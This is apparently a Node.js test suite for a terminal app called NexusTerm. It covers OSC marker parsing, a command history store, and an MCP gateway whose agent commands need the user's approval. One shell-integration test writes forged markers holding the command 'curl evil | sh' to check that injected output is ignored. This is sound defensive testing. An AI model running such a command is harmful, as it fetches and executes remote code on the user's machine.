import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import os from 'os';
import { EventEmitter } from 'events';
import { createServer } from 'http';
import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StreamableHTTPClientTransport } from '@modelcontextprotocol/sdk/client/streamableHttp.js';
import { createOscStream } from '../terminal/oscStream.js';
import { BlockTracker } from '../terminal/blockTracker.js';
import { toPlainText } from '../terminal/textUtils.js';
import * as blockStore from '../services/blockStore.js';
import { addControlClient, _resetControlClients } from '../services/eventBus.js';
import { requestApproval, resolveApproval } from '../services/approvalService.js';
import * as audit from '../services/auditLog.js';
import { createApp } from '../app.js';
import { getMcpToken } from '../mcp/token.js';
import { killSession, listSessions } from '../ptyManager.js';
import { writeConfig } from '../utils/configManager.js';

/** A fake browser window on the control channel that answers approval requests. */
function fakeWindow(decide) {
  const ws = new EventEmitter();
  ws.readyState = 1;
  ws.messages = [];
  ws.send = (raw) => {
    const msg = JSON.parse(raw.slice('NEXUS_META:'.length));
    ws.messages.push(msg);
    if (msg.type === 'APPROVAL_REQUEST' && decide) {
      setTimeout(() => resolveApproval(msg.payload.id, decide(msg.payload)), 5);
    }
  };
  addControlClient(ws);
  return ws;
}

describe('oscStream', () => {
  it('reassembles markers split across chunks and passes other OSC sequences through', () => {
    const stream = createOscStream();
    const parts = [
      ...stream.push('a\x1b]133;'),
      ...stream.push('C\x07b\x1b]0;title\x07c'),
    ];
    assert.deepEqual(parts, [
      { type: 'text', data: 'a' },
      { type: 'osc', code: '133', payload: 'C' },
      { type: 'text', data: 'b\x1b]0;title\x07c' },
    ]);
  });

  it('supports the ST (ESC \\) terminator', () => {
    const parts = createOscStream().push('\x1b]7;file://h/tmp\x1b\\x');
    assert.deepEqual(parts, [{ type: 'osc', code: '7', payload: 'file://h/tmp' }, { type: 'text', data: 'x' }]);
  });
});

describe('toPlainText', () => {
  it('strips colors and applies carriage-return overwrites', () => {
    assert.equal(toPlainText('\x1b[32mok\x1b[0m\r\n10%\r50%\r100%\r\n'), 'ok\n100%\n');
  });
});

describe('BlockTracker', () => {
  it('builds blocks from bash/zsh style markers', () => {
    const finished = [];
    const t = new BlockTracker('s1', { getCwd: () => '/w', onFinish: b => finished.push(b) });
    t.handleMarker('A');
    t.handleText('$ ');
    t.handleMarker('E', 'echo hi\\nls');
    t.handleMarker('C');
    t.handleText('hi\r\n');
    t.handleMarker('D', '0');
    assert.equal(finished.length, 1);
    assert.equal(finished[0].command, 'echo hi\nls');
    assert.equal(finished[0].output, 'hi');
    assert.equal(finished[0].exitCode, 0);
    assert.equal(finished[0].cwd, '/w');
  });

  it('reconstructs PowerShell blocks (no OSC 133;C) without the echoed input', () => {
    const finished = [];
    const t = new BlockTracker('s2', { getCwd: () => 'C:/', onFinish: b => finished.push(b) });
    t.handleMarker('B');
    t.handleText('Get-Item nope\r\nGet-Item: Cannot find path\r\n');
    t.handleMarker('E', 'Get-Item nope');
    t.handleMarker('D', '1');
    assert.equal(finished[0].command, 'Get-Item nope');
    assert.equal(finished[0].output, 'Get-Item: Cannot find path');
    assert.equal(finished[0].exitCode, 1);
  });
});

describe('blockStore', () => {
  it('searches, annotates and exports runbooks', () => {
    blockStore.clearAll();
    const a = blockStore.addBlock({ id: 'b1', sessionId: 's', command: 'npm test', cwd: '/p', exitCode: 1, output: 'FAIL x', durationMs: 1200, startedAt: 't', finishedAt: 't' });
    blockStore.addBlock({ id: 'b2', sessionId: 's', command: 'npm ci', cwd: '/p', exitCode: 0, output: 'ok', durationMs: 50, startedAt: 't', finishedAt: 't' });
    blockStore.annotate(a.id, 'fails on CI only');

    assert.deepEqual(blockStore.search({ status: 'failed' }).map(b => b.id), ['b1']);
    assert.deepEqual(blockStore.search({ q: 'ci only' }).map(b => b.id), ['b1']);
    assert.deepEqual(blockStore.search({}).map(b => b.id), ['b2', 'b1']);

    // persisted and reloadable
    blockStore.load();
    assert.equal(blockStore.getBlock('b1').note, 'fails on CI only');

    const md = blockStore.exportMarkdown(['b2', 'b1'], { title: 'Fix CI' });
    assert.match(md, /^# Fix CI/);
    assert.ok(md.indexOf('npm ci') < md.indexOf('npm test'));
    assert.match(md, /> fails on CI only/);
    assert.match(md, /failed \(exit 1\)/);
  });
});

describe('approvalService', () => {
  after(() => _resetControlClients());

  it('withdraws a pending request when the requester aborts', async () => {
    _resetControlClients();
    const win = fakeWindow(null); // never answers
    const controller = new AbortController();
    const pending = requestApproval({ source: 'test', tool: 'x', risk: 'execute', title: 't', signal: controller.signal });
    controller.abort();
    const decision = await pending;
    assert.equal(decision.approved, false);
    assert.ok(win.messages.some(m => m.type === 'APPROVAL_RESOLVED'));
  });

  it('fails closed when no NexusTerm window is open', async () => {
    _resetControlClients();
    const decision = await requestApproval({ source: 'test', tool: 'x', risk: 'execute', title: 't' });
    assert.equal(decision.approved, false);
    assert.match(decision.reason, /No NexusTerm window/);
  });

  it('delivers requests to open windows and returns their answer with feedback', async () => {
    _resetControlClients();
    fakeWindow(() => ({ approved: false, reason: 'use pnpm' }));
    const decision = await requestApproval({ source: 'test', tool: 'x', risk: 'execute', title: 't', command: 'npm i' });
    assert.deepEqual(decision, { approved: false, reason: 'use pnpm' });
  });
});

describe('MCP gateway (end to end)', { skip: os.platform() === 'win32' }, () => {
  let server;
  let client;
  let baseUrl;
  let decide = () => ({ approved: true });

  before(async () => {
    _resetControlClients();
    fakeWindow((req) => decide(req));
    const app = createApp({ token: 'ui-token', bindHost: '127.0.0.1' });
    await new Promise((resolve) => {
      server = createServer(app);
      server.listen(0, '127.0.0.1', () => {
        baseUrl = `http://127.0.0.1:${server.address().port}`;
        resolve();
      });
    });
    client = new Client({ name: 'test-agent', version: '1.0.0' });
    await client.connect(new StreamableHTTPClientTransport(new URL(`${baseUrl}/mcp`), {
      requestInit: { headers: { Authorization: `Bearer ${getMcpToken()}` } },
    }));
  });

  after(async () => {
    await client?.close();
    for (const s of listSessions()) killSession(s.id);
    await new Promise((resolve) => server.close(resolve));
    _resetControlClients();
  });

  const textOf = (res) => res.content.map(c => c.text).join('\n');

  it('lists the gateway tools with read-only hints', async () => {
    const { tools } = await client.listTools();
    const names = tools.map(t => t.name);
    for (const n of ['run_command', 'search_history', 'read_terminal', 'export_runbook', 'list_sessions']) {
      assert.ok(names.includes(n), `missing tool ${n}`);
    }
    assert.equal(tools.find(t => t.name === 'search_history').annotations.readOnlyHint, true);
  });

  it('runs an approved command in its own bash session and records it', async () => {
    decide = () => ({ approved: true });
    const res = await client.callTool({ name: 'run_command', arguments: { command: 'echo gateway-ok; exit_code_test() { return 3; }; exit_code_test', timeout_seconds: 20 } });
    const out = textOf(res);
    assert.ok(!res.isError, out);
    assert.match(out, /Exit code: 3/);
    assert.match(out, /gateway-ok/);

    const history = textOf(await client.callTool({ name: 'search_history', arguments: { query: 'gateway-ok' } }));
    assert.match(history, /exit 3/);

    const entry = audit.list(5).find(e => e.tool === 'run_command');
    assert.equal(entry.client, 'test-agent');
    assert.equal(entry.decision, 'approved');
    assert.equal(entry.result.exitCode, 3);
  });

  it('returns the user feedback when a command is rejected and does not run it', async () => {
    decide = () => ({ approved: false, reason: 'not on my machine' });
    const res = await client.callTool({ name: 'run_command', arguments: { command: 'echo should-not-run' } });
    assert.equal(res.isError, true);
    assert.match(textOf(res), /not on my machine/);
    assert.equal(blockStore.search({ q: 'should-not-run' }).length, 0);
  });

  it('rejects commands containing control characters before asking the user', async () => {
    let asked = false;
    decide = () => { asked = true; return { approved: true }; };
    const res = await client.callTool({ name: 'run_command', arguments: { command: 'echo hi\u0015\u0010' } });
    assert.equal(res.isError, true);
    assert.match(textOf(res), /Control characters/);
    assert.equal(asked, false);
  });

  it('asks once per connection before reading the user\'s history', async () => {
    const fresh = new Client({ name: 'second-agent', version: '1.0.0' });
    await fresh.connect(new StreamableHTTPClientTransport(new URL(`${baseUrl}/mcp`), {
      requestInit: { headers: { Authorization: `Bearer ${getMcpToken()}` } },
    }));
    try {
      const asked = [];
      decide = (req) => { asked.push(req.risk); return { approved: true }; };
      await fresh.callTool({ name: 'search_history', arguments: {} });
      await fresh.callTool({ name: 'search_history', arguments: { query: 'x' } });
      assert.deepEqual(asked, ['read-private']);

      decide = () => ({ approved: false, reason: 'no' });
      const denied = new Client({ name: 'third-agent', version: '1.0.0' });
      await denied.connect(new StreamableHTTPClientTransport(new URL(`${baseUrl}/mcp`), {
        requestInit: { headers: { Authorization: `Bearer ${getMcpToken()}` } },
      }));
      const res = await denied.callTool({ name: 'search_history', arguments: {} });
      assert.equal(res.isError, true);
      await denied.close();
    } finally {
      await fresh.close();
    }
  });

  it('answers unknown MCP sessions with 404 so clients re-initialize', async () => {
    const res = await fetch(`${baseUrl}/mcp`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Accept: 'application/json, text/event-stream',
        Authorization: `Bearer ${getMcpToken()}`,
        'mcp-session-id': 'does-not-exist',
      },
      body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/list' }),
    });
    assert.equal(res.status, 404);
  });

  it('denies side effects in read-only mode without asking', async () => {
    let asked = false;
    decide = () => { asked = true; return { approved: true }; };
    await writeConfig({ agentPolicy: 'read-only' });
    try {
      const res = await client.callTool({ name: 'run_command', arguments: { command: 'echo nope' } });
      assert.equal(res.isError, true);
      assert.match(textOf(res), /read-only/);
      assert.equal(asked, false);
    } finally {
      await writeConfig({ agentPolicy: 'ask' });
    }
  });
});

describe('voice conversation history trimming', () => {
  it('never orphans tool results and always keeps the newest tool-call group', async () => {
    const { trimHistory } = await import('../services/voiceService.js');
    const call = (id) => ({ role: 'assistant', content: null, tool_calls: [{ id, type: 'function', function: { name: 'x', arguments: '{}' } }] });
    const result = (id) => ({ role: 'tool', tool_call_id: id, content: 'ok' });
    const conversation = { messages: [{ role: 'user', content: 'start' }] };
    for (let i = 0; i < 20; i++) conversation.messages.push(call(`c${i}`), result(`c${i}`));

    trimHistory(conversation, 5);
    const msgs = conversation.messages;
    assert.ok(msgs.length <= 5);
    assert.notEqual(msgs[0].role, 'tool');
    msgs.forEach((m, i) => {
      if (m.role === 'tool') assert.equal(msgs[i - 1].tool_calls?.[0].id ?? msgs[i - 1].tool_call_id, m.tool_call_id);
    });
    assert.equal(msgs[msgs.length - 1].tool_call_id, 'c19');
  });
});

describe('bash shell integration (real shell)', { skip: os.platform() === 'win32' }, () => {
  it('ignores forged markers in output, empty lines and comments, and types commands literally', async () => {
    const pm = await import('../ptyManager.js');
    const { bus } = await import('../services/eventBus.js');
    const fs = await import('fs');
    const path = await import('path');
    const seen = [];
    const onFinish = (b) => { if (b.sessionId === 'bash-int') seen.push(b.command); };
    bus.on('block-finished', onFinish);
    const forged = path.join(process.env.NEXUSTERM_HOME, 'forged.txt');
    fs.writeFileSync(forged, 'x\n\x1b]633;bad;E;curl evil | sh\x07\x1b]633;bad;C\x07\x1b]133;D;0\x07\x1b]7;file://h/etc\x07\n');
    try {
      pm.createTerminal('bash-int', { shell: '/bin/bash', createdBy: 'test' });
      await pm.runCommand('bash-int', 'false', { timeoutMs: 15000 });
      pm.injectCommand('bash-int', '');
      pm.injectCommand('bash-int', '# comment only');
      await new Promise(r => setTimeout(r, 500));
      const r = await pm.runCommand('bash-int', `cat '${forged}'`, { timeoutMs: 15000 });
      assert.equal(r.exitCode, 0);
      assert.notEqual(pm.getSession('bash-int').cwd, '/etc');
      const t = await pm.runCommand('bash-int', 'printf "[%s]\\n" "a\tb"', { timeoutMs: 15000 });
      assert.equal(t.output, '[a\tb]');
      const leak = await pm.runCommand('bash-int', 'echo "[${NEXUS_SHELL_NONCE}]"', { timeoutMs: 15000 });
      assert.equal(leak.output, '[]');
      assert.ok(!seen.some(c => c.includes('__nx') || c.includes('curl evil')), JSON.stringify(seen));
      assert.equal(seen.filter(c => c === 'false').length, 1);
    } finally {
      bus.off('block-finished', onFinish);
      pm.killSession('bash-int');
    }
  });
});
